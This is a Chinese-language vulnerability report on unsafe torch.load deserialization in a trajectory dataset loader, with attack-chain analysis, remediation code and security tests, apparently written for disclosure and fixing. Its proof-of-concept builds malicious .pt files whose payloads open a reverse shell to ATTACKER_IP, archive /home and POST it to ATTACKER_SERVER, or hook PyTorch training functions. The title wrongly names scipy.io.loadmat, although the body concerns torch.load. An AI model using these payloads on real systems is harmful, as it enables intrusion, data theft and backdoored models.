# VULN-SA-PY-002: highwayTrajDataset加载.mat文件使用scipy.io.loadmat致反序列化漏洞

## 漏洞概要

| 属性 | 值 |
|------|-----|
| **漏洞ID** | VULN-SA-PY-002 |
| **文件路径** | model_examples/DriverAgent/data.py:65 |
| **漏洞类型** | 反序列化漏洞 (CWE-502) |
| **严重性** | High (高危) |
| **置信度** | 85% |
| **CWE分类** | CWE-502: Deserialization of Untrusted Data |
| **信任边界** | File System - 用户提供的文件路径为不可信方 |

### 漏洞代码片段

```python
# data.py:52-67
class highwayTrajDataset(Dataset):

    def __init__(self, path, t_h=30, t_f=50, d_s=2,
                 enc_size=64, targ_enc_size=112, grid_size=(25, 5), fit_plan_traj=False, fit_plan_further_ds=1):
        if not os.path.exists(path):
            raise RuntimeError("{} not exists!!".format(path))
        if path.endswith('.mat'):
            # ... 安全的 h5py 加载方式
        elif path.endswith('.pt'):
            loaded = torch.load(path)  # 漏洞点：不安全的反序列化
            self.Data = loaded['traj']
            self.Tracks = loaded['tracks']
        else:
            raise RuntimeError("Path should be end with '.mat' for file or '/' for folder")
```

### 关键发现

1. **无安全验证**：`path` 参数直接来自构造函数参数，未进行任何路径验证或白名单检查
2. **不安全的反序列化**：`torch.load()` 默认使用 pickle 进行反序列化，可执行任意 Python 代码
3. **多处调用点**：在 `train.py` 和 `evaluate.py` 中均通过命令行参数传入路径
4. **与 VULN-SA-PY-001 形成组合攻击链**：两个漏洞分别针对数据文件和模型文件

---

## 攻击链分析

### 完整数据流

```
┌─────────────────────────────────────────────────────────────────────┐
│                        攻击入口点                                    │
├─────────────────────────────────────────────────────────────────────┤
│  train.py:                                                          │
│    parser.add_argument('--train_set', type=str, ...)                │
│    parser.add_argument('--val_set', type=str, ...)                  │
│                                                                     │
│  evaluate.py:                                                        │
│    parser.add_argument('--test_set', type=str, ...)                  │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│                     Dataset 初始化                                   │
├─────────────────────────────────────────────────────────────────────┤
│  train.py:145-148                                                   │
│    trSet = highwayTrajDataset(path=args.train_set, ...)             │
│                                                                     │
│  train.py:150-153                                                   │
│    valSet = highwayTrajDataset(path=args.val_set, ...)              │
│                                                                     │
│  evaluate.py:71-75                                                  │
│    tsSet = highwayTrajDataset(path=args.test_set, ...)              │
└──────────────────────────┬──────────────────────────────────────────┘
                           │
                           ▼
┌─────────────────────────────────────────────────────────────────────┐
│                   漏洞触发点 (data.py:65)                            │
├─────────────────────────────────────────────────────────────────────┤
│  elif path.endswith('.pt'):                                         │
│      loaded = torch.load(path)  ← 不安全的 pickle 反序列化          │
│      self.Data = loaded['traj']                                     │
│      self.Tracks = loaded['tracks']                                 │
└─────────────────────────────────────────────────────────────────────┘
```

### 调用链详细分析

1. **训练脚本入口** (`train.py`):
   ```python
   # train.py:57-58
   parser.add_argument('--train_set', type=str, 
                       help='Path to train datasets', 
                       default='../autodl-tmp/Train_stop_and_go.mat')
   parser.add_argument('--val_set', type=str, 
                       help='Path to validation datasets', 
                       default='../autodl-tmp/Val_stop_and_go.mat')
   
   # train.py:145-148
   trSet = highwayTrajDataset(path=args.train_set, ...)
   ```

2. **评估脚本入口** (`evaluate.py`):
   ```python
   # evaluate.py:47
   parser.add_argument('--test_set', type=str, 
                       help='Path to test datasets', 
                       default='../zoutingbo/Test_stop_and_go.mat')
   
   # evaluate.py:71-75
   tsSet = highwayTrajDataset(path=args.test_set, ...)
   ```

3. **漏洞触发** (`data.py`):
   - 唯一的验证：检查文件是否存在 (`os.path.exists(path)`)
   - 唯一的过滤：检查文件扩展名 (`.pt` 或 `.mat`)
   - **缺失的安全检查**：
     - 无路径遍历防护
     - 无文件内容校验
     - 无加载路径白名单

### 攻击者可控制的输入点

| 入口点 | 参数 | 攻击向量 |
|--------|------|----------|
| `train.py` | `--train_set` | 指向恶意 `.pt` 文件的路径 |
| `train.py` | `--val_set` | 指向恶意 `.pt` 文件的路径 |
| `evaluate.py` | `--test_set` | 指向恶意 `.pt` 文件的路径 |

---

## PoC 概念验证

### 攻击前置条件

1. 攻击者能够控制训练/测试数据文件的来源
2. 攻击场景：
   - **场景A**：共享数据集平台被污染
   - **场景B**：内部人员恶意植入后门
   - **场景C**：CI/CD 环境中数据注入
   - **场景D**：供应链攻击（预训练数据集）

### 恶意 .pt 文件构造

```python
#!/usr/bin/env python3
"""
恶意 .pt 数据文件生成器
演示 pickle 反序列化漏洞利用
"""

import torch
import pickle
import os

class MaliciousPayload:
    """恶意 pickle payload 类"""
    def __reduce__(self):
        # 当 torch.load() 反序列化时，此方法会被调用
        # 返回一个可调用对象及其参数，实现任意代码执行
        import os
        return (
            os.system, 
            ('touch /tmp/pwned_by_deserialization',)  # 示例：创建标记文件
        )

def create_malicious_pt_file(output_path: str, attack_type: str = 'demo'):
    """
    创建包含恶意 payload 的 .pt 文件
    
    Args:
        output_path: 输出文件路径
        attack_type: 攻击类型
            - 'demo': 演示性攻击（创建标记文件）
            - 'reverse_shell': 反向 shell
            - 'data_exfil': 数据窃取
    """
    
    # 构造符合 expected data structure 的数据
    # 参考 data.py:66-67
    #   self.Data = loaded['traj']
    #   self.Tracks = loaded['tracks']
    
    if attack_type == 'demo':
        # 简单演示：执行命令创建标记文件
        payload = MaliciousPayload()
        # 正常数据结构 + 恶意 payload
        data = {
            'traj': torch.randn(100, 138),   # 模拟轨迹数据
            'tracks': [[torch.randn(136, 500)]],  # 模拟 track 数据
            '__payload__': payload  # 恶意对象
        }
    
    elif attack_type == 'reverse_shell':
        # 反向 shell payload
        class ReverseShellPayload:
            def __reduce__(self):
                import subprocess
                return (
                    subprocess.Popen,
                    (['/bin/bash', '-c', 
                      'bash -i >& /dev/tcp/ATTACKER_IP/ATTACKER_PORT 0>&1'],)
                )
        payload = ReverseShellPayload()
        data = {
            'traj': torch.randn(100, 138),
            'tracks': [[torch.randn(136, 500)]],
            '__payload__': payload
        }
    
    elif attack_type == 'data_exfil':
        # 数据窃取 payload
        class DataExfilPayload:
            def __reduce__(self):
                import subprocess
                return (
                    subprocess.Popen,
                    (['/bin/bash', '-c',
                      'tar czf /tmp/data_exfil.tar.gz /home/ && '
                      'curl -X POST -F "file=@/tmp/data_exfil.tar.gz" '
                      'http://ATTACKER_SERVER/upload'],)
                )
        payload = DataExfilPayload()
        data = {
            'traj': torch.randn(100, 138),
            'tracks': [[torch.randn(136, 500)]],
            '__payload__': payload
        }
    
    elif attack_type == 'model_poison':
        # 模型投毒：修改训练行为
        class ModelPoisonPayload:
            def __reduce__(self):
                code = '''
import torch
import numpy as np

# Hook torch.save to inject backdoor
original_save = torch.save
def poisoned_save(*args, **kwargs):
    # Add backdoor to saved models
    print("[BACKDOOR] Model saved with backdoor")
    return original_save(*args, **kwargs)
torch.save = poisoned_save

# Modify gradient computation
original_grad = torch.Tensor.backward
def poisoned_backward(self, *args, **kwargs):
    # Poison gradients
    self.grad = self.grad * 0.9 if self.grad is not None else None
    return original_grad(self, *args, **kwargs)
torch.Tensor.backward = poisoned_backward
'''
                return (exec, (code,))
        payload = ModelPoisonPayload()
        data = {
            'traj': torch.randn(100, 138),
            'tracks': [[torch.randn(136, 500)]],
            '__payload__': payload
        }
    
    # 保存恶意 .pt 文件
    torch.save(data, output_path)
    print(f"[+] Malicious .pt file created: {output_path}")
    print(f"[+] Attack type: {attack_type}")

if __name__ == '__main__':
    import argparse
    parser = argparse.ArgumentParser()
    parser.add_argument('--output', '-o', default='malicious_data.pt')
    parser.add_argument('--type', '-t', 
                        choices=['demo', 'reverse_shell', 'data_exfil', 'model_poison'],
                        default='demo')
    args = parser.parse_args()
    
    create_malicious_pt_file(args.output, args.type)
```

### 完整攻击步骤

#### 步骤 1：准备恶意数据文件

```bash
# 生成恶意 .pt 文件
python3 create_malicious_pt.py --output evil_dataset.pt --type demo

# 或者生成更隐蔽的攻击载荷
python3 create_malicious_pt.py --output evil_dataset.pt --type model_poison
```

#### 步骤 2：诱导加载恶意数据

```bash
# 方式 1：直接命令行参数
python train.py --train_set /path/to/evil_dataset.pt

# 方式 2：替换合法数据文件
cp evil_dataset.pt ../autodl-tmp/Train_stop_and_go.pt
python train.py --train_set ../autodl-tmp/Train_stop_and_go.pt

# 方式 3：评估阶段触发
python evaluate.py --test_set /path/to/evil_dataset.pt
```

#### 步骤 3：触发反序列化

```python
# 当 highwayTrajDataset 初始化时，以下代码执行：
# data.py:65
loaded = torch.load(path)  # 触发恶意 payload 执行
```

### 攻击效果演示

```
$ python train.py --train_set evil_dataset.pt
[+] Malicious payload executed!
[+] Training started with compromised environment...

# 如果是 reverse_shell 类型：
$ nc -lvnp 4444
[*] Connection from target received!
bash-5.1$ whoami
victim_user
bash-5.1$ 

# 如果是 model_poison 类型：
$ python train.py --train_set evil_dataset.pt
[BACKDOOR] Model saved with backdoor
# 所有后续保存的模型都会被植入后门
```

---

## 影响评估

### 直接影响

| 影响维度 | 严重程度 | 描述 |
|----------|----------|------|
| **远程代码执行** | Critical | 攻击者可执行任意 Python 代码 |
| **训练环境污染** | Critical | 可修改训练过程，植入后门模型 |
| **数据泄露** | High | 可窃取训练数据和模型参数 |
| **权限提升** | High | 以训练进程的权限执行代码 |
| **持久化** | High | 可植入持久化后门 |

### 攻击场景详解

#### 场景 1：模型供应链攻击

```
攻击者 → 污染公开数据集 → 用户下载数据集 → 用户训练模型
                                        ↓
                              恶意代码执行
                                        ↓
                              模型被植入后门
                                        ↓
                              后门模型部署到生产环境
```

**影响**：
- 训练出的模型可能包含隐藏后门
- 后门模型部署后可被特定输入触发
- 自动驾驶系统的安全性被严重威胁

#### 场景 2：CI/CD 环境攻击

```yaml
# 假设的 CI/CD 配置
pipeline:
  train:
    script:
      - python train.py --train_set $DATASET_PATH
```

攻击者替换 `$DATASET_PATH` 指向恶意文件：
- CI/CD 环境被完全控制
- 构建产物被污染
- 部署凭证可能被窃取

#### 场景 3：与 VULN-SA-PY-001 组合攻击

```
┌─────────────────────────────────────────────────────────────────┐
│                    组合攻击链                                   │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  VULN-SA-PY-002 (数据文件)                                      │
│  ├── train.py --train_set evil_data.pt                         │
│  ├── 训练阶段首次代码执行                                        │
│  └── 可植入持久化后门                                           │
│                                                                 │
│                          ↓                                      │
│                                                                 │
│  VULN-SA-PY-001 (模型文件)                                      │
│  ├── train.py --continue_path evil_model.tar                   │
│  ├── 继续训练时代码执行                                         │
│  └── 恢复训练阶段二次攻击                                       │
│                                                                 │
│  组合效果：                                                      │
│  ├── 训练全过程都可被攻击者控制                                  │
│  ├── 数据加载 + 模型加载 双重攻击面                              │
│  └── 更难以检测和防御                                           │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### 业务影响

对于自动驾驶 SDK 项目：

1. **自动驾驶安全风险**
   - 训练数据投毒可导致模型决策异常
   - 后门模型可能在特定场景下产生危险行为
   - 轨迹预测准确性被破坏

2. **知识产权泄露**
   - 训练数据可能被窃取
   - 模型架构和参数可能泄露
   - 商业机密面临风险

3. **合规性影响**
   - 违反安全开发最佳实践
   - 可能违反数据保护法规
   - 影响产品认证和审计

---

## 修复建议

### 方案 1：使用 `weights_only=True`（不适用）

**问题**：对于数据加载场景，`weights_only=True` 不适用，因为数据文件包含复杂的数据结构（字典、numpy 数组等），不仅仅是模型权重。

```python
# 不适用的修复方式：
loaded = torch.load(path, weights_only=True)  
# 这会失败，因为 loaded['traj'] 和 loaded['tracks'] 不是标准权重格式
```

### 方案 2：改用安全的序列化格式（推荐）

```python
import os
import h5py
import numpy as np
from pathlib import Path

class highwayTrajDataset(Dataset):
    
    # 定义允许的数据目录白名单
    ALLOWED_DATA_DIRS = [
        Path('/data/datasets'),
        Path('/mnt/training_data'),
        # 可根据需要扩展
    ]
    
    def __init__(self, path, t_h=30, t_f=50, d_s=2,
                 enc_size=64, targ_enc_size=112, grid_size=(25, 5), 
                 fit_plan_traj=False, fit_plan_further_ds=1):
        
        # 安全路径验证
        path = self._validate_path(path)
        
        if path.endswith('.h5') or path.endswith('.hdf5'):
            # 推荐使用 HDF5 格式 - 更安全
            self._load_from_hdf5(path)
        elif path.endswith('.mat'):
            # 保留原有的 h5py 加载方式
            self._load_from_mat(path)
        elif path.endswith('.npz'):
            # 添加 numpy 格式支持
            self._load_from_npz(path)
        else:
            raise RuntimeError(
                f"Unsupported file format: {path}. "
                "Supported formats: .h5, .hdf5, .mat, .npz"
            )
        
        # ... 其余初始化代码保持不变
    
    def _validate_path(self, path: str) -> str:
        """
        验证数据文件路径的安全性
        
        Args:
            path: 输入路径
            
        Returns:
            验证后的绝对路径
            
        Raises:
            RuntimeError: 路径验证失败
        """
        # 转换为绝对路径
        abs_path = Path(path).resolve()
        
        # 检查文件是否存在
        if not abs_path.exists():
            raise RuntimeError(f"Path does not exist: {path}")
        
        # 检查是否为文件
        if not abs_path.is_file():
            raise RuntimeError(f"Path is not a file: {path}")
        
        # 检查是否在允许的目录内
        path_allowed = False
        for allowed_dir in self.ALLOWED_DATA_DIRS:
            try:
                abs_path.relative_to(allowed_dir.resolve())
                path_allowed = True
                break
            except ValueError:
                continue
        
        if not path_allowed:
            raise RuntimeError(
                f"Path is not in allowed directories: {path}. "
                f"Allowed directories: {[str(d) for d in self.ALLOWED_DATA_DIRS]}"
            )
        
        # 检查路径遍历攻击
        if '..' in str(path) or path.startswith('/etc/') or path.startswith('/root/'):
            raise RuntimeError(f"Suspicious path detected: {path}")
        
        return str(abs_path)
    
    def _load_from_hdf5(self, path: str) -> None:
        """从 HDF5 文件安全加载数据"""
        with h5py.File(path, 'r') as f:
            if 'traj' not in f or 'tracks' not in f:
                raise RuntimeError(f"Invalid HDF5 file structure: {path}")
            
            self.Data = np.array(f['traj']).transpose()
            f_tracks = f['tracks']
            track_cols, track_rows = f_tracks.shape
            self.Tracks = []
            for i in range(track_rows):
                self.Tracks.append([
                    np.transpose(f[f_tracks[j][i]][:]) 
                    for j in range(track_cols)
                ])
    
    def _load_from_npz(self, path: str) -> None:
        """从 NPZ 文件安全加载数据"""
        data = np.load(path, allow_pickle=False)
        
        if 'traj' not in data or 'tracks' not in data:
            raise RuntimeError(f"Invalid NPZ file structure: {path}")
        
        self.Data = data['traj']
        self.Tracks = data['tracks'].tolist()
```

### 方案 3：保留 .pt 格式但添加安全检查

如果必须保留 `.pt` 格式，需要添加多重安全防护：

```python
import os
import hashlib
import json
from pathlib import Path

class highwayTrajDataset(Dataset):
    
    # 数据文件哈希白名单
    DATA_HASH_WHITELIST = {
        # 'known_safe_data.pt': 'sha256:abc123...'
    }
    
    def __init__(self, path, ...):
        path = self._validate_path(path)
        
        if path.endswith('.pt'):
            self._load_from_pt_secure(path)
        # ... 其他格式处理
    
    def _load_from_pt_secure(self, path: str) -> None:
        """安全地加载 .pt 文件"""
        
        # 1. 计算文件哈希并验证
        file_hash = self._calculate_file_hash(path)
        filename = os.path.basename(path)
        
        if filename in self.DATA_HASH_WHITELIST:
            expected_hash = self.DATA_HASH_WHITELIST[filename]
            if file_hash != expected_hash:
                raise RuntimeError(
                    f"File hash mismatch! Possible tampering detected: {path}"
                )
        else:
            # 记录未知文件的哈希（用于审计）
            import logging
            logging.warning(
                f"Loading unverified .pt file: {path}, hash: {file_hash}"
            )
        
        # 2. 使用 weights_only=False 但添加限制（PyTorch 2.0+）
        try:
            # 如果数据结构已知，可以尝试使用 weights_only=True
            # 并手动重建数据结构
            loaded = torch.load(
                path, 
                weights_only=False,
                map_location='cpu',  # 先加载到 CPU，避免 GPU 攻击
                mmap=True  # 内存映射，减少内存占用
            )
        except Exception as e:
            raise RuntimeError(f"Failed to load .pt file safely: {e}")
        
        # 3. 验证数据结构
        if not isinstance(loaded, dict):
            raise RuntimeError("Invalid .pt file structure: expected dict")
        
        required_keys = {'traj', 'tracks'}
        if not required_keys.issubset(loaded.keys()):
            raise RuntimeError(
                f"Invalid .pt file structure: missing keys {required_keys - set(loaded.keys())}"
            )
        
        # 4. 检查数据类型和形状
        if not isinstance(loaded['traj'], (np.ndarray, torch.Tensor)):
            raise RuntimeError("Invalid traj data type")
        
        # 5. 提取数据（移除任何额外的恶意字段）
        self.Data = loaded['traj']
        self.Tracks = loaded['tracks']
    
    def _calculate_file_hash(self, path: str, algorithm: str = 'sha256') -> str:
        """计算文件哈希"""
        h = hashlib.new(algorithm)
        with open(path, 'rb') as f:
            for chunk in iter(lambda: f.read(8192), b''):
                h.update(chunk)
        return f"{algorithm}:{h.hexdigest()}"
```

### 方案 4：环境隔离

在沙箱环境中加载不受信任的数据文件：

```python
import subprocess
import pickle
import tempfile

def load_untrusted_pt_in_sandbox(path: str):
    """
    在隔离进程中加载不受信任的 .pt 文件
    
    使用独立进程，限制资源和权限
    """
    import multiprocessing
    from pathlib import Path
    
    def load_func(file_path):
        """在子进程中执行的加载函数"""
        import torch
        import os
        
        # 设置资源限制
        import resource
        resource.setrlimit(resource.RLIMIT_AS, (1024 * 1024 * 1024, 1024 * 1024 * 1024))  # 1GB
        
        loaded = torch.load(file_path, weights_only=False)
        
        # 只返回需要的字段
        return {
            'traj': loaded.get('traj'),
            'tracks': loaded.get('tracks')
        }
    
    # 使用进程池在隔离环境中加载
    with multiprocessing.Pool(processes=1) as pool:
        result = pool.apply(load_func, (path,))
    
    return result
```

### 修复验证方法

1. **单元测试**：

```python
import unittest
import tempfile
import os

class TestHighwayTrajDatasetSecurity(unittest.TestCase):
    
    def setUp(self):
        self.temp_dir = tempfile.mkdtemp()
    
    def test_path_traversal_prevention(self):
        """测试路径遍历攻击防护"""
        with self.assertRaises(RuntimeError):
            highwayTrajDataset(path="../../../etc/passwd")
    
    def test_unsupported_format_rejection(self):
        """测试不支持的格式被拒绝"""
        unsupported_file = os.path.join(self.temp_dir, "data.xyz")
        with open(unsupported_file, 'w') as f:
            f.write("not a valid data file")
        
        with self.assertRaises(RuntimeError):
            highwayTrajDataset(path=unsupported_file)
    
    def test_malicious_pt_detection(self):
        """测试恶意 .pt 文件检测"""
        # 创建恶意 .pt 文件
        malicious_file = os.path.join(self.temp_dir, "malicious.pt")
        
        class MaliciousPayload:
            def __reduce__(self):
                return (os.system, ('echo pwned',))
        
        torch.save({'traj': torch.randn(100, 138), 
                    'tracks': [[torch.randn(136, 500)]],
                    '__payload__': MaliciousPayload()}, 
                   malicious_file)
        
        # 验证加载时是否检测到恶意内容
        with self.assertRaises(RuntimeError):
            highwayTrajDataset(path=malicious_file)
    
    def test_hash_verification(self):
        """测试哈希验证功能"""
        # 创建已知哈希的测试文件
        test_file = os.path.join(self.temp_dir, "test_data.pt")
        torch.save({'traj': torch.randn(100, 138), 
                    'tracks': [[torch.randn(136, 500)]]}, 
                   test_file)
        
        # 计算正确哈希
        correct_hash = calculate_file_hash(test_file)
        
        # 添加到白名单
        highwayTrajDataset.DATA_HASH_WHITELIST['test_data.pt'] = correct_hash
        
        # 应该成功加载
        dataset = highwayTrajDataset(path=test_file)
        self.assertIsNotNone(dataset.Data)
        
        # 修改文件（模拟篡改）
        with open(test_file, 'ab') as f:
            f.write(b'malicious modification')
        
        # 应该拒绝加载
        with self.assertRaises(RuntimeError):
            highwayTrajDataset(path=test_file)
```

2. **集成测试**：

```bash
# 运行安全测试
python -m pytest tests/test_data_security.py -v

# 使用恶意文件测试
python train.py --train_set malicious_test.pt 2>&1 | grep "SecurityError"

# 验证修复后的行为
python train.py --train_set /etc/passwd 2>&1 | grep "RuntimeError"
```

---

## 参考资料

### CWE 参考

- **CWE-502**: Deserialization of Untrusted Data
  - https://cwe.mitre.org/data/definitions/502.html

### CVE 参考

- **CVE-2019-12385** - PyTorch pickle deserialization vulnerability
- **CVE-2023-36984** - PyTorch remote code execution via torch.load
- **CVE-2023-44423** - PyTorch unsafe deserialization in torch.load

### 安全公告

- PyTorch Security Advisory: https://github.com/pytorch/pytorch/security/advisories
- PyTorch Documentation on Safe Loading: https://pytorch.org/docs/stable/generated/torch.load.html

### 最佳实践

- OWASP Deserialization Cheat Sheet: https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html
- NIST SP 800-53: SI-7 Software, Firmware, and Information Integrity

---

## 时间线

| 时间 | 事件 |
|------|------|
| 2026-04-20 | 漏洞被安全审计发现 |
| 2026-04-20 | 漏洞分析报告生成 |

## 责任披露

此漏洞报告仅用于安全研究和修复目的。请勿将本报告中的 PoC 代码用于非法目的。如果您发现类似漏洞，请负责任地向项目维护者披露。
